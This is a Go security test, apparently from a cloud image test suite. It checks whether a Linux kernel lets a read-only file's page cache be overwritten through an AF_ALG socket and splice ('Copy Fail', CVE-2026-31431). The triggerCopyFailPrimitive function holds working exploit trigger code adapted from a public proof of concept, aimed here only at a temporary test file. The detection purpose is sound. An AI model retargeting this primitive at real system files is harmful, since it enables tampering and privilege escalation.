// Copyright 2024 Google LLC.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//go:build linux
// +build linux

package security

import (
	"bytes"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"unsafe"

	"github.com/GoogleCloudPlatform/cloud-image-tests/utils"
	"golang.org/x/sys/unix"
)

const (
	solAlg             = 279
	algSetKey          = 1
	algSetIv           = 2
	algSetOp           = 3
	algSetAeadAssoclen = 4
	algSetAeadAuthsize = 5
)

func packCmsg(level, typ int, data []byte) []byte {
	cmsgSpace := unix.CmsgSpace(len(data))
	b := make([]byte, cmsgSpace)

	h := (*unix.Cmsghdr)(unsafe.Pointer(&b[0]))
	h.Level = int32(level)
	h.Type = int32(typ)
	h.SetLen(unix.CmsgLen(len(data)))

	copy(b[unix.CmsgLen(0):], data)
	return b
}

// This function is adapted from the public Copy Fail CVE-2026-31431 PoC trigger path:
// https://github.com/badsectorlabs/copyfail-go/blob/main/main.go
// triggerCopyFailPrimitive initializes a vulnerable AF_ALG cryptographic socket and injects a precise
// 4-byte pollution seed via the associated authenticated data (AAD) control stream.
// It then leverages a zero-copy double-splice pipeline to expose the read-only physical file pages
// directly as the active cipher destination buffer, mechanically forcing an in-place memory boundary
// overwrite.
func triggerCopyFailPrimitive(t *testing.T, f *os.File, marker []byte) error {
	if len(marker) != 4 {
		t.Logf("marker validation failed: marker must be exactly 4 bytes, got %d", len(marker))
		return fmt.Errorf("marker must be exactly 4 bytes, got %d", len(marker))
	}

	fd, err := unix.Socket(unix.AF_ALG, unix.SOCK_SEQPACKET, 0)
	if err != nil {
		t.Logf("create AF_ALG socket failed: %v", err)
		return fmt.Errorf("create AF_ALG socket: %w", err)
	}
	defer unix.Close(fd)

	sa := &unix.SockaddrALG{
		Type: "aead",
		Name: "authencesn(hmac(sha256),cbc(aes))",
	}

	if err := unix.Bind(fd, sa); err != nil {
		t.Logf("bind AF_ALG aead/authencesn socket failed: %v", err)
		return fmt.Errorf("bind AF_ALG aead/authencesn socket: %w", err)
	}

	keyHex := "0800010000000010" + strings.Repeat("0", 64)
	keyBytes, err := hex.DecodeString(keyHex)
	if err != nil {
		t.Logf("decode AF_ALG key hex failed: %v", err)
		return fmt.Errorf("decode AF_ALG key hex: %w", err)
	}

	if err := unix.SetsockoptString(fd, solAlg, algSetKey, string(keyBytes)); err != nil {
		t.Logf("set AF_ALG key failed: %v", err)
		return fmt.Errorf("set AF_ALG key: %w", err)
	}

	if err := unix.SetsockoptInt(fd, solAlg, algSetAeadAuthsize, 4); err != nil {
		t.Logf("set AF_ALG authsize failed: %v", err)
		return fmt.Errorf("set AF_ALG authsize: %w", err)
	}

	uFdRaw, _, errno := unix.Syscall6(
		unix.SYS_ACCEPT4,
		uintptr(fd),
		0,
		0,
		0,
		0,
		0,
	)
	if errno != 0 {
		t.Logf("accept AF_ALG operation socket failed: %v", errno)
		return fmt.Errorf("accept AF_ALG operation socket: %w", errno)
	}

	uFd := int(uFdRaw)
	defer unix.Close(uFd)

	var oob []byte

	oob = append(oob, packCmsg(solAlg, algSetOp, []byte{0, 0, 0, 0})...)
	oob = append(oob, packCmsg(solAlg, algSetIv, append([]byte{0x10}, make([]byte, 19)...))...)
	oob = append(oob, packCmsg(solAlg, algSetAeadAssoclen, []byte{8, 0, 0, 0})...)

	msgData := append([]byte("AAAA"), marker...)

	if err := unix.Sendmsg(uFd, msgData, oob, nil, unix.MSG_MORE); err != nil {
		t.Logf("send AF_ALG message failed: %v", err)
		return fmt.Errorf("send AF_ALG message: %w", err)
	}

	var p [2]int
	if err := unix.Pipe(p[:]); err != nil {
		t.Logf("create pipe failed: %v", err)
		return fmt.Errorf("create pipe: %w", err)
	}
	defer unix.Close(p[0])
	defer unix.Close(p[1])

	offset := int64(0)
	spliceLen := 4

	if _, err := unix.Splice(int(f.Fd()), &offset, p[1], nil, spliceLen, 0); err != nil {
		t.Logf("splice file to pipe failed: %v", err)
		return fmt.Errorf("splice file to pipe: %w", err)
	}

	if _, err := unix.Splice(p[0], nil, uFd, nil, spliceLen, 0); err != nil {
		t.Logf("splice pipe to AF_ALG socket failed: %v", err)
		return fmt.Errorf("splice pipe to AF_ALG socket: %w", err)
	}

	buf := make([]byte, 8)
	if n, err := unix.Read(uFd, buf); err != nil {
		if errors.Is(err, unix.EBADMSG) {
			t.Logf("read AF_ALG output returned EBADMSG/bad message: n=%d err=%v", n, err)
			t.Logf("continuing to read back target bytes; final decision is based on after == marker")
			return nil
		}
		t.Logf("read AF_ALG output failed: n=%d err=%T %v", n, err, err)
	}

	t.Logf("triggerCopyFailPrimitive completed successfully")
	return nil
}

// TestCopyFailPageCacheOverwrite4Bytes simulates a zero-copy AF_ALG socket splice() attack to detect
// whether a read-only 4-byte page cache boundary can be illicitly mutated in place.
func TestCopyFailPageCacheOverwrite4Bytes(t *testing.T) {
	utils.LinuxOnly(t)

	image, err := utils.GetMetadata(utils.Context(t), "instance", "image")
	if err != nil {
		t.Fatalf("couldn't get image from metadata: %v", err)
	}

	// Skip outdated vulnerable images from before April 2026
	failedImages := []string{
		"ubuntu-accelerator-2204-amd64-with-nvidia-570",
		"ubuntu-accelerator-2404-amd64-with-nvidia-570",
		"ubuntu-pro-1604-xenial",
		"daily-ubuntu-2004-focal",
		"daily-ubuntu-2004-focal-arm64",
		"daily-ubuntu-minimal-2004-focal",
		"daily-ubuntu-minimal-2004-focal-arm64",
		"daily-ubuntu-minimal-2410-oracular-amd64",
		"sles16-gm",
		"daily-ubuntu-minimal-2410-oracular-arm64",
		"daily-ubuntu-2504-plucky-amd64",
	}

	for _, failedImg := range failedImages {
		if strings.Contains(image, failedImg) {
			t.Skipf("skipping outdated vulnerable image: %s", failedImg)
		}
	}

	marker := []byte("BBBB")

	dir := t.TempDir()
	targetPath := filepath.Join(dir, "readonly-target")

	// Known file contents: before[0:4] should be "AAAA".
	// If the primitive is still vulnerable, after[0:4] may become "BBBB".
	original := bytes.Repeat([]byte("A"), 4096)

	if err := os.WriteFile(targetPath, original, 0444); err != nil {
		t.Fatalf("create target file: %v", err)
	}

	f, err := os.Open(targetPath)
	if err != nil {
		t.Fatalf("open target read-only: %v", err)
	}
	defer f.Close()

	before := make([]byte, len(marker))
	n, err := f.ReadAt(before, 0)
	if err != nil && err != io.EOF {
		t.Fatalf("read before bytes: %v", err)
	}
	if n != len(marker) {
		t.Fatalf("read before bytes: got %d bytes, want %d", n, len(marker))
	}

	t.Logf("before overwrite attempt: %q", before)

	if bytes.Equal(before, marker) {
		t.Fatalf("test setup invalid: before bytes already equal marker %q", marker)
	}

	err = triggerCopyFailPrimitive(t, f, marker)
	if err != nil {
		if errors.Is(err, unix.ENOENT) ||
			errors.Is(err, unix.ENODEV) ||
			errors.Is(err, unix.EAFNOSUPPORT) ||
			errors.Is(err, unix.EOPNOTSUPP) ||
			errors.Is(err, unix.ENOPROTOOPT) {
			t.Skipf("AF_ALG/authencesn path unavailable on this image: %v", err)
		}

		t.Logf("primitive trigger path did not complete: %v", err)
		t.Logf("page-cache overwrite not observed")
		return
	}

	after := make([]byte, len(marker))
	n, err = f.ReadAt(after, 0)
	if err != nil && err != io.EOF {
		t.Fatalf("read after bytes: %v", err)
	}
	if n != len(marker) {
		t.Fatalf("read after bytes: got %d bytes, want %d", n, len(marker))
	}

	t.Logf("after overwrite attempt: %q", after)

	if bytes.Equal(after, marker) {
		t.Fatalf("VULNERABLE: 4-byte page-cache overwrite primitive observed: before=%q after=%q marker=%q", before, after, marker)
	}

	t.Logf("PASS: 4-byte marker overwrite was not observed: before=%q after=%q marker=%q", before, after, marker)
}
